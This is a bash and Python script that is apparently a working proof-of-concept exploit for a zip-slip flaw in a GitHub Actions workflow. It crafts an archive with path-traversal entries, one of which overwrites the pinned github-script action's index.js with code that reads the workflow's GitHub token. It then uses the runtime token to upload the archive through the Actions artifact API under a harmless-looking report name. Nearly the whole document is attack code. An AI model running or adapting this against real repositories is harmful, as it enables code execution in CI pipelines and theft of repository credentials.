#!/usr/bin/env bash
set -euo pipefail

GSHA="3a2844b7e9c422d3c10d287c895573f7108da1b3"   # actions/github-script pinned by the victim workflow
mkdir -p out

python3 - "$GSHA" <<'PY'
import sys, zipfile
gsha = sys.argv[1]
payload = (
    "const fs=require('fs');\n"
    "const t=process.env['INPUT_GITHUB-TOKEN']||'';\n"
    "fs.writeFileSync('/home/runner/work/zipslip-rce.txt',\n"
    "  'RCE_VIA_GITHUB_SCRIPT token_present='+(t?'yes':'no')+' token_len='+t.length+'\\n');\n"
)
with zipfile.ZipFile('out/evil.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('../../../zipslip-marker.txt', 'ZIP_SLIP_ESCAPED_bench-report\n')
    z.writestr('../../../_actions/actions/github-script/%s/dist/index.js' % gsha, payload)
    z.writestr('summary.md', '## hi\n')
    z.writestr('report.md', '## hi\n')
PY

TOKEN="$ACTIONS_RUNTIME_TOKEN"
BASE=$(python3 -c "import os,urllib.parse;u=urllib.parse.urlparse(os.environ['ACTIONS_RESULTS_URL']);print(u.scheme+'://'+u.netloc)")

SCOPE=$(python3 - <<'PY'
import base64, json, os
t = os.environ['ACTIONS_RUNTIME_TOKEN'].split('.')[1]
t += '=' * (-len(t) % 4)
print(json.loads(base64.urlsafe_b64decode(t)).get('scp',''))
PY
)
echo "scope: $SCOPE"
RUN_ID=$(python3 -c "import sys;s=sys.argv[1];p=[x for x in s.split() if x.startswith('Actions.Results:')][0].split(':');print(p[1])" "$SCOPE")
JOB_ID=$(python3 -c "import sys;s=sys.argv[1];p=[x for x in s.split() if x.startswith('Actions.Results:')][0].split(':');print(p[2])" "$SCOPE")
echo "run=$RUN_ID job=$JOB_ID base=$BASE"

CREATE=$(curl -s --max-time 30 -X POST \
  "$BASE/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"workflowRunBackendId\":\"$RUN_ID\",\"workflowJobRunBackendId\":\"$JOB_ID\",\"name\":\"cli-bench-report\",\"version\":7,\"mimeType\":{\"value\":\"application/zip\"}}")
echo "create: $CREATE"
SIGNED=$(printf '%s' "$CREATE" | python3 -c 'import sys,json;print(json.load(sys.stdin)["signedUploadUrl"])')

SIZE=$(stat -c %s out/evil.zip)
HASH="sha256:$(sha256sum out/evil.zip | cut -d' ' -f1)"

CODE=$(curl -s --max-time 60 -o /dev/null -w '%{http_code}' -X PUT \
  -H 'x-ms-blob-type: BlockBlob' -H 'Content-Type: application/zip' \
  --data-binary @out/evil.zip "$SIGNED")
echo "put status: $CODE"

FIN=$(curl -s --max-time 30 -X POST \
  "$BASE/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"workflowRunBackendId\":\"$RUN_ID\",\"workflowJobRunBackendId\":\"$JOB_ID\",\"name\":\"cli-bench-report\",\"size\":\"$SIZE\",\"hash\":{\"value\":\"$HASH\"}}")
echo "finalize: $FIN"
